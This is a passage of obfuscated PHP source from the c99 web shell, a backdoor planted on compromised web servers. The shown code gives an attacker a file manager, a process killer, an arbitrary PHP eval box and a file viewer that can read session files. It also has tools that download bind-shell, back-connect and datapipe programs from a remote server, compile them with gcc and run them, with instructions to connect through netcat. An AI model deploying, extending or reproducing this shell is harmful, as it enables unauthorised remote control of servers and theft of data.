$sp208cb5['folders'][] = $spfe8f01; } elseif (is_file($spc85aba)) { $sp208cb5['files'][] = $spfe8f01; } $spc58e00++; } } $sp023e76 = array_merge($sp208cb5['cols'], $sp208cb5['head'], $sp208cb5['folders'], $sp208cb5['links'], $sp208cb5['files']); echo '<center><b>Listing folder (' . count($sp208cb5['files']) . ' files and ' . (count($sp208cb5['folders']) + count($sp208cb5['links'])) . ' folders):</b></center><br><TABLE cellSpacing=0 cellPadding=0 width=100% bgColor=#333333 borderColorLight=#433333 border=0><form action="' . $sp4f5f94 . '" method=POST name="ls_form"><input type=hidden name=act value=' . $sp3fc037 . '><input type=hidden name=d value=' . $sp549585 . '>'; foreach ($sp023e76 as $spfe8f01) { echo '<tr>
'; foreach ($spfe8f01 as $spc85aba) { echo '<td>' . $spc85aba . '</td>
'; } echo '</tr>
'; } echo '</table><hr size="1" noshade><p align="right">
  <script>
  function ls_setcheckboxall(status)
  {
   var id = 1;
   var num = ' . (count($sp023e76) - 2) . ';
   while (id <= num)
   {
    document.getElementById(\'actbox\'+id).checked = status;
    id++;
   }
  }
  function ls_reverse_all()
  {
   var id = 1;
   var num = ' . (count($sp023e76) - 2) . ';
   while (id <= num)
   {
    document.getElementById(\'actbox\'+id).checked = !document.getElementById(\'actbox\'+id).checked;
    id++;
   }
  }
  </script>
  <input type="button" onclick="ls_setcheckboxall(true);" value="Select all">&nbsp;&nbsp;<input type="button" onclick="ls_setcheckboxall(false);" value="Unselect all"> 
  <b><img src="' . $sp4f5f94 . 'act=img&img=arrow_ltr" border="0">'; if (count(array_merge($sp597c2f['copy'], $sp597c2f['cut'])) > 0 and $spb8d715) { echo '<input type=submit name=actarcbuff value="Pack buffer to archive">&nbsp;<input type="text" name="actarcbuff_path" value="archive_' . substr(md5(rand(1, 1000) . rand(1, 1000)), 0, 5) . '.tar.gz">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name="actpastebuff" value="Paste">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name="actemptybuff" value="Empty buffer">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'; } echo '<select name=act><option value="' . $spabab30 . '">With selected:</option>'; echo '<option value=delete' . ($sp3fc037 == 'delete' ? ' selected' : '') . '>Delete</option>'; echo '<option value=chmod' . ($sp3fc037 == 'chmod' ? ' selected' : '') . '>Change-mode</option>'; if ($spb8d715) { echo '<option value=cut' . ($sp3fc037 == 'cut' ? ' selected' : '') . '>Cut</option>'; echo '<option value=copy' . ($sp3fc037 == 'copy' ? ' selected' : '') . '>Copy</option>'; echo '<option value=unselect' . ($sp3fc037 == 'unselect' ? ' selected' : '') . '>Unselect</option>'; } echo '</select>&nbsp;<input type=submit value="Confirm"></p>'; echo '</form>'; } } if ($spabab30 == 'tools') { $sp2e8d0a = array('c99sh_bindport.pl' => array('Using PERL', 'perl %path %port'), 'c99sh_bindport.c' => array('Using C', '%path %port %pass')); $spf497cf = array('c99sh_backconn.pl' => array('Using PERL', 'perl %path %host %port'), 'c99sh_backconn.c' => array('Using C', '%path %host %port')); $spd4dcfc = array('c99sh_datapipe.pl' => array('Using PERL', 'perl %path %localport %remotehost %remoteport'), 'c99sh_datapipe.c' => array('Using C', '%path %localport %remoteport %remotehost')); if (!is_array($spd5252b)) { $spd5252b = array(); } if (!is_array($sp4d3729)) { $sp4d3729 = array(); } if (!is_array($sp8a30ff)) { $sp8a30ff = array(); } if (!is_numeric($spd5252b['port'])) { $spd5252b['port'] = $spc0ba48; } if (empty($spd5252b['pass'])) { $spd5252b['pass'] = $sp2ee0a4; } if (empty($sp4d3729['host'])) { $sp4d3729['host'] = getenv('REMOTE_ADDR'); } if (!is_numeric($sp4d3729['port'])) { $sp4d3729['port'] = $sp816a08; } if (empty($sp8a30ff['remoteaddr'])) { $sp8a30ff['remoteaddr'] = 'irc.dalnet.ru:6667'; } if (!is_numeric($sp8a30ff['localport'])) { $sp8a30ff['localport'] = $spbc7b54; } if (!empty($sp1fe966)) { echo '<b>Result of binding port:</b><br>'; $spc85aba = $sp2e8d0a[$spd5252b['src']]; if (empty($spc85aba)) { echo 'Unknown file!<br>'; } elseif (fsockopen(getenv('SERVER_ADDR'), $spd5252b['port'], $sp9913da, $sp7d8dc3, 0.1)) { echo 'Port alredy in use, select any other!<br>'; } else { $spfff108 = explode('.', $spd5252b['src']); $sp0beeb7 = $spfff108[count($spfff108) - 1]; unset($spfff108[count($spfff108) - 1]); $spde5994 = join('.', $spfff108) . '.' . rand(0, 999) . '.' . $sp0beeb7; $sp59b489 = $spe05b78 . join('.', $spfff108) . rand(0, 999); if ($sp0beeb7 == 'pl') { $sp59b489 = $spde5994; } @unlink($spde5994); $spe2e680 = fopen($spde5994, 'ab+'); if (!$spe2e680) { echo 'Can\'t write sources to "' . $spde5994 . '"!<br>'; } elseif (!($sp8dce42 = c99getsource($spd5252b['src']))) { echo 'Can\'t download sources!'; } else { fwrite($spe2e680, $sp8dce42, strlen($sp8dce42)); fclose($spe2e680); if ($sp0beeb7 == 'c') { $spab9ffb = myshellexec('gcc -o ' . $sp59b489 . ' ' . $spde5994); @unlink($spde5994); } $spc85aba[1] = str_replace('%path', $sp59b489, $spc85aba[1]); $spc85aba[1] = str_replace('%port', $spd5252b['port'], $spc85aba[1]); $spc85aba[1] = str_replace('%pass', $spd5252b['pass'], $spc85aba[1]); $spc85aba[1] = str_replace('//', '/', $spc85aba[1]); $sp8ee947 = myshellexec($spc85aba[1] . ' > /dev/null &'); sleep(5); $spb7af44 = fsockopen('localhost', $spd5252b['port'], $sp9913da, $sp7d8dc3, 5); if (!$spb7af44) { echo 'I can\'t connect to localhost:' . $spd5252b['port'] . '! I think you should configure your firewall.'; } else { echo 'Binding... ok! Connect to <b>' . getenv('SERVER_ADDR') . ':' . $spd5252b['port'] . '</b>! You should use NetCat&copy;, run "<b>nc -v ' . getenv('SERVER_ADDR') . ' ' . $spd5252b['port'] . '</b>"!<center><a href="' . $sp4f5f94 . 'act=processes&grep=' . basename($sp59b489) . '"><u>View binder\'s process</u></a></center>'; } } echo '<br>'; } } if (!empty($spec98bf)) { echo '<b>Result of back connection:</b><br>'; $spc85aba = $spf497cf[$sp4d3729['src']]; if (empty($spc85aba)) { echo 'Unknown file!<br>'; } else { $spfff108 = explode('.', $sp4d3729['src']); $sp0beeb7 = $spfff108[count($spfff108) - 1]; unset($spfff108[count($spfff108) - 1]); $spde5994 = join('.', $spfff108) . '.' . rand(0, 999) . '.' . $sp0beeb7; $sp59b489 = $spe05b78 . join('.', $spfff108) . rand(0, 999); if ($sp0beeb7 == 'pl') { $sp59b489 = $spde5994; } @unlink($spde5994); $spe2e680 = fopen($spde5994, 'ab+'); if (!$spe2e680) { echo 'Can\'t write sources to "' . $spde5994 . '"!<br>'; } elseif (!($sp8dce42 = c99getsource($sp4d3729['src']))) { echo 'Can\'t download sources!'; } else { fwrite($spe2e680, $sp8dce42, strlen($sp8dce42)); fclose($spe2e680); if ($sp0beeb7 == 'c') { $spab9ffb = myshellexec('gcc -o ' . $sp59b489 . ' ' . $spde5994); @unlink($spde5994); } $spc85aba[1] = str_replace('%path', $sp59b489, $spc85aba[1]); $spc85aba[1] = str_replace('%host', $sp4d3729['host'], $spc85aba[1]); $spc85aba[1] = str_replace('%port', $sp4d3729['port'], $spc85aba[1]); $spc85aba[1] = str_replace('//', '/', $spc85aba[1]); $sp8ee947 = myshellexec($spc85aba[1] . ' > /dev/null &'); echo 'Now script try connect to ' . htmlspecialchars($sp4d3729['host']) . ':' . htmlspecialchars($sp4d3729['port']) . '...<br>'; } } } if (!empty($spc93bd8)) { echo '<b>Result of datapipe-running:</b><br>'; $spc85aba = $spd4dcfc[$sp8a30ff['src']]; if (empty($spc85aba)) { echo 'Unknown file!<br>'; } elseif (fsockopen(getenv('SERVER_ADDR'), $sp8a30ff['port'], $sp9913da, $sp7d8dc3, 0.1)) { echo 'Port alredy in use, select any other!<br>'; } else { $spde5994 = $spe05b78 . $sp8a30ff['src']; $spfff108 = explode('.', $sp8a30ff['src']); $sp0beeb7 = $spfff108[count($spfff108) - 1]; unset($spfff108[count($spfff108) - 1]); $spde5994 = join('.', $spfff108) . '.' . rand(0, 999) . '.' . $sp0beeb7; $sp59b489 = $spe05b78 . join('.', $spfff108) . rand(0, 999); if ($sp0beeb7 == 'pl') { $sp59b489 = $spde5994; } @unlink($spde5994); $spe2e680 = fopen($spde5994, 'ab+'); if (!$spe2e680) { echo 'Can\'t write sources to "' . $spde5994 . '"!<br>'; } elseif (!($sp8dce42 = c99getsource($sp8a30ff['src']))) { echo 'Can\'t download sources!'; } else { fwrite($spe2e680, $sp8dce42, strlen($sp8dce42)); fclose($spe2e680); if ($sp0beeb7 == 'c') { $spab9ffb = myshellexec('gcc -o ' . $sp59b489 . ' ' . $spde5994); @unlink($spde5994); } list($sp8a30ff['remotehost'], $sp8a30ff['remoteport']) = explode(':', $sp8a30ff['remoteaddr']); $spc85aba[1] = str_replace('%path', $sp59b489, $spc85aba[1]); $spc85aba[1] = str_replace('%localport', $sp8a30ff['localport'], $spc85aba[1]); $spc85aba[1] = str_replace('%remotehost', $sp8a30ff['remotehost'], $spc85aba[1]); $spc85aba[1] = str_replace('%remoteport', $sp8a30ff['remoteport'], $spc85aba[1]); $spc85aba[1] = str_replace('//', '/', $spc85aba[1]); $sp8ee947 = myshellexec($spc85aba[1] . ' > /dev/null &'); sleep(5); $spb7af44 = fsockopen('localhost', $sp8a30ff['port'], $sp9913da, $sp7d8dc3, 5); if (!$spb7af44) { echo 'I can\'t connect to localhost:' . $sp8a30ff['localport'] . '! I think you should configure your firewall.'; } else { echo 'Running datapipe... ok! Connect to <b>' . getenv('SERVER_ADDR') . ':' . $sp8a30ff['port'] . ', and you will connected to ' . $sp8a30ff['remoteaddr'] . '</b>! You should use NetCat&copy;, run "<b>nc -v ' . getenv('SERVER_ADDR') . ' ' . $spd5252b['port'] . '</b>"!<center><a href="' . $sp4f5f94 . 'act=processes&grep=' . basename($sp59b489) . '"><u>View datapipe process</u></a></center>'; } } echo '<br>'; } } ?>
<b>Binding port:</b><br><form action="<?php  echo $sp4f5f94; ?>
"><input type=hidden name=act value=tools><input type=hidden name=d value="<?php  echo $sp549585; ?>
">Port: <input type=text name="bind[port]" value="<?php  echo htmlspecialchars($spd5252b['port']); ?>
">&nbsp;Password: <input type=text name="bind[pass]" value="<?php  echo htmlspecialchars($spd5252b['pass']); ?>
">&nbsp;<select name="bind[src]"><?php  foreach ($sp2e8d0a as $spf38c9d => $spc85aba) { echo '<option value="' . $spf38c9d . '"'; if ($spf38c9d == $spd5252b['src']) { echo ' selected'; } echo '>' . $spc85aba[0] . '</option>'; } ?>
</select>&nbsp;<input type=submit name=bindsubmit value="Bind"></form>
<b>Back connection:</b><br><form action="<?php  echo $sp4f5f94; ?>
"><input type=hidden name=act value=tools><input type=hidden name=d value="<?php  echo $sp549585; ?>
">HOST: <input type=text name="bc[host]" value="<?php  echo htmlspecialchars($sp4d3729['host']); ?>
">&nbsp;Port: <input type=text name="bc[port]" value="<?php  echo htmlspecialchars($sp4d3729['port']); ?>
">&nbsp;<select name="bc[src]"><?php  foreach ($spf497cf as $spf38c9d => $spc85aba) { echo '<option value="' . $spf38c9d . '"'; if ($spf38c9d == $sp4d3729['src']) { echo ' selected'; } echo '>' . $spc85aba[0] . '</option>'; } ?>
</select>&nbsp;<input type=submit name=bcsubmit value="Connect"></form>
Click "Connect" only after open port for it. You should use NetCat&copy;, run "<b>nc -l -n -v -p <?php  echo $sp816a08; ?>
</b>"!<br><br>
<b>Datapipe:</b><br><form action="<?php  echo $sp4f5f94; ?>
"><input type=hidden name=act value=tools><input type=hidden name=d value="<?php  echo $sp549585; ?>
">HOST: <input type=text name="datapipe[remoteaddr]" value="<?php  echo htmlspecialchars($sp8a30ff['remoteaddr']); ?>
">&nbsp;Local port: <input type=text name="datapipe[localport]" value="<?php  echo htmlspecialchars($sp8a30ff['localport']); ?>
">&nbsp;<select name="datapipe[src]"><?php  foreach ($spd4dcfc as $spf38c9d => $spc85aba) { echo '<option value="' . $spf38c9d . '"'; if ($spf38c9d == $sp4d3729['src']) { echo ' selected'; } echo '>' . $spc85aba[0] . '</option>'; } ?>
</select>&nbsp;<input type=submit name=dpsubmit value="Run"></form><b>Note:</b> sources will be downloaded from remote server.<?php  } if ($spabab30 == 'processes') { echo '<b>Processes:</b><br>'; if (!$sp919bf1) { $sp189da2 = 'ps -aux' . ($spd5f822 ? ' | grep \'' . addslashes($spd5f822) . '\'' : ''); } else { $sp189da2 = 'tasklist'; } $sp6ec051 = myshellexec($sp189da2); if (!$sp6ec051) { echo 'Can\'t execute "' . $sp189da2 . '"!'; } else { if (empty($sp03cf0f)) { $sp03cf0f = $spc0f332; } $spf295be = parsesort($sp03cf0f); if (!is_numeric($spf295be[0])) { $spf295be[0] = 0; } $spf38c9d = $spf295be[0]; if ($spf295be[1] != 'a') { $spa9bfcb = '<a href="' . $sp4f5f94 . 'act=' . $sp3fc037 . '&d=' . urlencode($sp549585) . '&processes_sort=' . $spf38c9d . 'a"><img src="' . $sp4f5f94 . 'act=img&img=sort_desc" height="9" width="14" border="0"></a>'; } else { $spa9bfcb = '<a href="' . $sp4f5f94 . 'act=' . $sp3fc037 . '&d=' . urlencode($sp549585) . '&processes_sort=' . $spf38c9d . 'd"><img src="' . $sp4f5f94 . 'act=img&img=sort_asc" height="9" width="14" border="0"></a>'; } $sp6ec051 = htmlspecialchars($sp6ec051); if (!$sp919bf1) { if ($spc4230c) { if (is_null($spa8e120)) { $spa8e120 = 9; } echo 'Sending signal ' . $spa8e120 . ' to #' . $spc4230c . '... '; if (posix_kill($spc4230c, $spa8e120)) { echo 'OK.'; } else { echo 'ERROR.'; } } while (ereg('  ', $sp6ec051)) { $sp6ec051 = str_replace('  ', ' ', $sp6ec051); } $sp36aa5a = explode('
', $sp6ec051); $sp1d7106 = explode(' ', $sp36aa5a[0]); unset($sp36aa5a[0]); for ($spc58e00 = 0; $spc58e00 < count($sp1d7106); $spc58e00++) { if ($spc58e00 != $spf38c9d) { $sp1d7106[$spc58e00] = '<a href="' . $sp4f5f94 . 'act=' . $sp3fc037 . '&d=' . urlencode($sp549585) . '&processes_sort=' . $spc58e00 . $spf295be[1] . '"><b>' . $sp1d7106[$spc58e00] . '</b></a>'; } } $sp7f9031 = array(); foreach ($sp36aa5a as $sp7ca350) { if (!empty($sp7ca350)) { echo '<tr>'; $sp7ca350 = explode(' ', $sp7ca350); $sp7ca350[10] = join(' ', array_slice($sp7ca350, 10)); $sp7ca350 = array_slice($sp7ca350, 0, 11); if ($sp7ca350[0] == get_current_user()) { $sp7ca350[0] = '<font color=green>' . $sp7ca350[0] . '</font>'; } $sp7ca350[] = '<a href="' . $sp4f5f94 . 'act=processes&d=' . urlencode($sp549585) . '&pid=' . $sp7ca350[1] . '&sig=9"><u>KILL</u></a>'; $sp7f9031[] = $sp7ca350; echo '</tr>'; } } } else { while (ereg('  ', $sp6ec051)) { $sp6ec051 = str_replace('  ', '', $sp6ec051); } while (ereg('  ', $sp6ec051)) { $sp6ec051 = str_replace('  ', '', $sp6ec051); } while (ereg('  ', $sp6ec051)) { $sp6ec051 = str_replace('  ', '', $sp6ec051); } while (ereg('  ', $sp6ec051)) { $sp6ec051 = str_replace('  ', '', $sp6ec051); } while (ereg('  ', $sp6ec051)) { $sp6ec051 = str_replace('  ', '', $sp6ec051); } while (ereg('  ', $sp6ec051)) { $sp6ec051 = str_replace('  ', '', $sp6ec051); } while (ereg('  ', $sp6ec051)) { $sp6ec051 = str_replace('  ', '', $sp6ec051); } while (ereg('  ', $sp6ec051)) { $sp6ec051 = str_replace('  ', '', $sp6ec051); } while (ereg('  ', $sp6ec051)) { $sp6ec051 = str_replace('  ', '', $sp6ec051); } while (ereg('', $sp6ec051)) { $sp6ec051 = str_replace('', '', $sp6ec051); } while (ereg(' ', $sp6ec051)) { $sp6ec051 = str_replace(' ', '', $sp6ec051); } $sp6ec051 = convert_cyr_string($sp6ec051, 'd', 'w'); $sp36aa5a = explode('
', $sp6ec051); unset($sp36aa5a[0], $sp36aa5a[2]); $sp36aa5a = array_values($sp36aa5a); $sp1d7106 = explode('', $sp36aa5a[0]); $sp1d7106[1] = explode(' ', $sp1d7106[1]); $sp1d7106[1] = $sp1d7106[1][0]; $sp36aa5a = array_slice($sp36aa5a, 1); unset($sp1d7106[2]); $sp1d7106 = array_values($sp1d7106); if ($spf295be[1] != 'a') { $spa9bfcb = '<a href="' . $sp4f5f94 . 'act=' . $sp3fc037 . '&d=' . urlencode($sp549585) . '&processes_sort=' . $spf38c9d . 'a"><img src="' . $sp4f5f94 . 'act=img&img=sort_desc" height="9" width="14" border="0"></a>'; } else { $spa9bfcb = '<a href="' . $sp4f5f94 . 'act=' . $sp3fc037 . '&d=' . urlencode($sp549585) . '&processes_sort=' . $spf38c9d . 'd"><img src="' . $sp4f5f94 . 'act=img&img=sort_asc" height="9" width="14" border="0"></a>'; } if ($spf38c9d > count($sp1d7106)) { $spf38c9d = count($sp1d7106) - 1; } for ($spc58e00 = 0; $spc58e00 < count($sp1d7106); $spc58e00++) { if ($spc58e00 != $spf38c9d) { $sp1d7106[$spc58e00] = '<a href="' . $sp4f5f94 . 'act=' . $sp3fc037 . '&d=' . urlencode($sp549585) . '&processes_sort=' . $spc58e00 . $spf295be[1] . '"><b>' . trim($sp1d7106[$spc58e00]) . '</b></a>'; } } $sp7f9031 = array(); foreach ($sp36aa5a as $sp7ca350) { if (!empty($sp7ca350)) { echo '<tr>'; $sp7ca350 = explode('', $sp7ca350); $sp7ca350[1] = intval($sp7ca350[1]); $sp7ca350[2] = $sp7ca350[3]; unset($sp7ca350[3]); $sp7ca350[2] = intval(str_replace(' ', '', $sp7ca350[2])) * 1024; $sp7f9031[] = $sp7ca350; echo '</tr>'; } } } $sp1d7106[$spf38c9d] = '<b>' . $sp1d7106[$spf38c9d] . '</b>' . $spa9bfcb; $spc85aba = $sp03cf0f[0]; usort($sp7f9031, 'tabsort'); if ($sp03cf0f[1] == 'd') { $sp7f9031 = array_reverse($sp7f9031); } $sp208cb5 = array(); $sp208cb5[] = $sp1d7106; $sp208cb5 = array_merge($sp208cb5, $sp7f9031); echo '<TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0">'; foreach ($sp208cb5 as $spc58e00 => $spf38c9d) { echo '<tr>'; foreach ($spf38c9d as $sp02ecb4 => $spc85aba) { if ($sp919bf1 and $spc58e00 > 0 and $sp02ecb4 == 2) { $spc85aba = view_size($spc85aba); } echo '<td>' . $spc85aba . '</td>'; } echo '</tr>'; } echo '</table>'; } } if ($spabab30 == 'eval') { if (!empty($sp2cae9d)) { echo '<b>Result of execution this PHP-code</b>:<br>'; $sp13d1b2 = ob_get_contents(); $sp9ae14b = realpath('.'); @chdir($sp549585); if ($sp13d1b2) { ob_clean(); eval($sp2cae9d); $sp6ec051 = ob_get_contents(); $sp6ec051 = convert_cyr_string($sp6ec051, 'd', 'w'); ob_clean(); echo $sp13d1b2; if ($spcf39fa) { $sp1098b7 = count(explode('
', $sp6ec051)) + 1; if ($sp1098b7 < 10) { $sp1098b7 = 10; } echo '<br><textarea cols="122" rows="' . $sp1098b7 . '" readonly>' . htmlspecialchars($sp6ec051) . '</textarea>'; } else { echo $sp6ec051 . '<br>'; } } else { if ($spcf39fa) { echo '<br><textarea cols="122" rows="15" readonly>'; eval($sp2cae9d); echo '</textarea>'; } else { echo $sp6ec051; } } @chdir($sp9ae14b); } else { echo '<b>Execution PHP-code</b>'; if (empty($spcf39fa)) { $spcf39fa = TRUE; } } echo '<form action="' . $sp4f5f94 . '" method=POST><input type=hidden name=act value=eval><textarea name="eval" cols="122" rows="10">' . htmlspecialchars($sp2cae9d) . '</textarea><input type=hidden name="d" value="' . $sp0391b3 . '"><br><br><input type=submit value="Execute">&nbsp;Display in text-area&nbsp;<input type="checkbox" name="eval_txt" value="1"'; if ($spcf39fa) { echo ' checked'; } echo '></form>'; } if ($spabab30 == 'f') { if ((!is_readable($sp549585 . $sp77bd8d) or is_dir($sp549585 . $sp77bd8d)) and $spf9c77a != 'edit') { if (file_exists($sp549585 . $sp77bd8d)) { echo '<center><b>Permision denied (' . htmlspecialchars($sp549585 . $sp77bd8d) . ')!</b></center>'; } else { echo '<center><b>File does not exists (' . htmlspecialchars($sp549585 . $sp77bd8d) . ')!</b><br><a href="' . $sp4f5f94 . 'act=f&f=' . urlencode($sp77bd8d) . '&ft=edit&d=' . urlencode($sp549585) . '&c=1"><u>Create</u></a></center>'; } } else { $sp7185b7 = @file_get_contents($sp549585 . $sp77bd8d); $sp0beeb7 = explode('.', $sp77bd8d); $spa89771 = count($sp0beeb7) - 1; $sp0beeb7 = $sp0beeb7[$spa89771]; $sp0beeb7 = strtolower($sp0beeb7); $sp553188 = ''; foreach ($sp62c601 as $spf38c9d => $spc85aba) { if (in_array($sp0beeb7, $spc85aba)) { $sp553188 = $spf38c9d; break; } } if (eregi('sess_(.*)', $sp77bd8d)) { $sp553188 = 'phpsess'; } if (empty($spf9c77a)) { $spf9c77a = $sp553188; } $spc5ba94 = array(array('<img src="' . $sp4f5f94 . 'act=img&img=ext_diz" border="0">', 'info'), array('<img src="' . $sp4f5f94 . 'act=img&img=ext_html" border="0">', 'html'), array('<img src="' . $sp4f5f94 . 'act=img&img=ext_txt" border="0">', 'txt'), array('Code', 'code'), array('Session', 'phpsess'), array('<img src="' . $sp4f5f94 . 'act=img&img=ext_exe" border="0">', 'exe'), array('SDB', 'sdb'), array('<img src="' . $sp4f5f94 . 'act=img&img=ext_gif" border="0">', 'img'), array('<img src="' . $sp4f5f94 . 'act=img&img=ext_ini" border="0">', 'ini'), array('<img src="' . $sp4f5f94 . 'act=img&img=download" border="0">', 'download'), array('<img src="' . $sp4f5f94 . 'act=img&img=ext_rtf" border="0">', 'notepad'), array('<img src="' . $sp4f5f94 . 'act=img&img=change" border="0">', 'edit')); echo '<b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;<img src="' . $sp4f5f94 . 'act=img&img=ext_' . $sp0beeb7 . '" border="0">&nbsp;' . $sp77bd8d . ' (' . view_size(filesize($sp549585 . $sp77bd8d)) . ') &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' . view_perms_color($sp549585 . $sp77bd8d) . '</b><br>Select action/file-type:<br>'; foreach ($spc5ba94 as $sp43d1d8) { if ($sp43d1d8[1] == $sp553188) { echo ' <a href="' . $sp4f5f94 . 'act=f&f=' . urlencode($sp77bd8d) . '&ft=' . $sp43d1d8[1] . '&d=' . urlencode($sp549585) . '"><font color=green>' . $sp43d1d8[0] . '</font></a>'; } elseif ($sp43d1d8[1] == $spf9c77a) { echo ' <a href="' . $sp4f5f94 . 'act=f&f=' . urlencode($sp77bd8d) . '&ft=' . $sp43d1d8[1] . '&d=' . urlencode($sp549585) . '"><b><u>' . $sp43d1d8[0] . '</u></b></a>'; } else { echo ' <a href="' . $sp4f5f94 . 'act=f&f=' . urlencode($sp77bd8d) . '&ft=' . $sp43d1d8[1] . '&d=' . urlencode($sp549585) . '"><b>' . $sp43d1d8[0] . '</b></a>'; } echo ' (<a href="' . $sp4f5f94 . 'act=f&f=' . urlencode($sp77bd8d) . '&ft=' . $sp43d1d8[1] . '&white=1&d=' . urlencode($sp549585) . '" target="_blank">+</a>) |'; } echo '<hr size="1" noshade>'; if ($spf9c77a == 'info') { echo '<b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> ' . $sp549585 . $sp77bd8d . '</td></tr><tr><td><b>Size</b></td><td> ' . view_size(filesize($sp549585 . $sp77bd8d)) . '</td></tr><tr><td><b>MD5</b></td><td> ' . md5_file($sp549585 . $sp77bd8d) . '</td></tr>'; if (!$sp919bf1) { echo '<tr><td><b>Owner/Group</b></td><td> '; $spd6aa15 = posix_getpwuid(fileowner($sp549585 . $sp77bd8d)); $sp87a0ea = posix_getgrgid(filegroup($sp549585 . $sp77bd8d)); echo ($spd6aa15['name'] ? $spd6aa15['name'] : fileowner($sp549585 . $sp77bd8d)) . '/' . ($sp87a0ea['name'] ? $sp87a0ea['name'] : filegroup($sp549585 . $sp77bd8d)); } echo '<tr><td><b>Perms</b></td><td><a href="' . $sp4f5f94 . 'act=chmod&f=' . urlencode($sp77bd8d) . '&d=' . urlencode($sp549585) . '">' . view_perms_color($sp549585 . $sp77bd8d) . '</a></td></tr><tr><td><b>Create time</b></td><td> ' . date('d/m/Y H:i:s', filectime($sp549585 . $sp77bd8d)) . '</td></tr><tr><td><b>Access time</b></td><td> ' . date('d/m/Y H:i:s', fileatime($sp549585 . $sp77bd8d)) . '</td></tr><tr><td><b>MODIFY time</b></td><td> ' . date('d/m/Y H:i:s', filemtime($sp549585 . $sp77bd8d)) . '</td></tr></table><br>'; $spe6aeb6 = fopen($sp549585 . $sp77bd8d, 'rb'); if ($spe6aeb6) { if ($sp63196f) { echo '<b>FULL HEXDUMP</b>'; $sp6d9eaf = fread($spe6aeb6, filesize($sp549585 . $sp77bd8d)); } else { echo '<b>HEXDUMP PREVIEW</b>'; $sp6d9eaf = fread($spe6aeb6, $sp071c94 * $sp4dc0b0); } $sp5b128e = 0; $sp7a22ce = '00000000<br>'; $spc2c7b3 = ''; $spd904e2 = ''; for ($spc58e00 = 0; $spc58e00 < strlen($sp6d9eaf); $spc58e00++) { $spc2c7b3 .= sprintf('%02X', ord($sp6d9eaf[$spc58e00])) . ' '; switch (ord($sp6d9eaf[$spc58e00])) { case 0: $spd904e2 .= '<font>0</font>'; break; case 32: case 10: case 13: $spd904e2 .= '&nbsp;'; break; default: $spd904e2 .= htmlspecialchars($sp6d9eaf[$spc58e00]); } $sp5b128e++; if ($sp5b128e == $sp4dc0b0) { $sp5b128e = 0; if ($spc58e00 + 1 < strlen($sp6d9eaf)) { $sp7a22ce .= sprintf('%08X', $spc58e00 + 1) . '<br>'; } $spc2c7b3 .= '<br>'; $spd904e2 .= '<br>'; } } echo '<table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr><td bgcolor=#666666>' . $sp7a22ce . '</td><td bgcolor=000000>' . $spc2c7b3 . '</td><td bgcolor=000000>' . $spd904e2 . '</td></tr></table><br>'; } $sp4d0b06 = ''; if ($sp717342 == 1) { echo '<b>Base64 Encode</b><br>'; $sp4d0b06 = base64_encode(file_get_contents($sp549585 . $sp77bd8d)); } elseif ($sp717342 == 2) { echo '<b>Base64 Encode + Chunk</b><br>'; $sp4d0b06 = chunk_split(base64_encode(file_get_contents($sp549585 . $sp77bd8d))); } elseif ($sp717342 == 3) { echo '<b>Base64 Encode + Chunk + Quotes</b><br>'; $sp4d0b06 = base64_encode(file_get_contents($sp549585 . $sp77bd8d)); $sp4d0b06 = substr(preg_replace('!.{1,76}!', '\'\\0\'.
', $sp4d0b06), 0, -2); } elseif ($sp717342 == 4) { $sp57a3c2 = file_get_contents($sp549585 . $sp77bd8d); $sp4d0b06 = base64_decode($sp57a3c2); echo '<b>Base64 Decode'; if (base64_encode($sp4d0b06) != $sp57a3c2) { echo ' (failed)'; } echo '</b><br>'; } if (!empty($sp4d0b06)) { echo '<textarea cols=80 rows=10>' . htmlspecialchars($sp4d0b06) . '</textarea><br><br>'; } echo '<b>HEXDUMP:</b><nobr> [<a href="' . $sp4f5f94 . 'act=f&f=' . urlencode($sp77bd8d) . '&ft=info&fullhexdump=1&d=' . urlencode($sp549585) . '">Full</a>] [<a href="' . $sp4f5f94 . 'act=f&f=' . urlencode($sp77bd8d) . '&ft=info&d=' . urlencode($sp549585) . '">Preview</a>]<br><b>Base64: </b>
<nobr>[<a href="' . $sp4f5f94 . 'act=f&f=' . urlencode($sp77bd8d) . '&ft=info&base64=1&d=' . urlencode($sp549585) . '">Encode</a>]&nbsp;</nobr>
<nobr>[<a href="' . $sp4f5f94 . 'act=f&f=' . urlencode($sp77bd8d) . '&ft=info&base64=2&d=' . urlencode($sp549585) . '">+chunk</a>]&nbsp;</nobr>
<nobr>[<a href="' . $sp4f5f94 . 'act=f&f=' . urlencode($sp77bd8d) . '&ft=info&base64=3&d=' . urlencode($sp549585) . '">+chunk+quotes</a>]&nbsp;</nobr>
<nobr>[<a href="' . $sp4f5f94 . 'act=f&f=' . urlencode($sp77bd8d) . '&ft=info&base64=4&d=' . urlencode($sp549585) . '">Decode</a>]&nbsp;</nobr>
<P>'; } elseif ($spf9c77a == 'html') { if ($spd39f62) { @ob_clean(); } echo $sp7185b7; if ($spd39f62) { c99shexit(); } } elseif ($spf9c77a == 'txt') { echo '<pre>' . htmlspecialchars($sp7185b7) . '</pre>'; } elseif ($spf9c77a == 'ini') { echo '<pre>'; var_dump(parse_ini_file($sp549585 . $sp77bd8d, TRUE)); echo '</pre>'; } elseif ($spf9c77a == 'phpsess') { echo '<pre>'; $spc85aba = explode('|', $sp7185b7); echo $spc85aba[0] . '<br>'; var_dump(unserialize($spc85aba[1])); echo '</pre>'; } elseif ($spf9c77a == 'exe') { $sp0beeb7 = explode('.', $sp77bd8d); $spa89771 = count($sp0beeb7) - 1; $sp0beeb7 = $sp0beeb7[$spa89771]; $sp0beeb7 = strtolower($sp0beeb7); $sp553188 = ''; foreach ($sp4f22dd as $spf38c9d => $spc85aba) { if (in_array($sp0beeb7, $spc85aba)) { $sp553188 = $spf38c9d; break; } } $spa71965 = str_replace('%f%', $sp77bd8d, $sp553188); echo '<b>Execute file:</b><form action="' . $sp4f5f94 . '" method=POST><input type=hidden name=act value=cmd><input type="text" name="cmd" value="' . 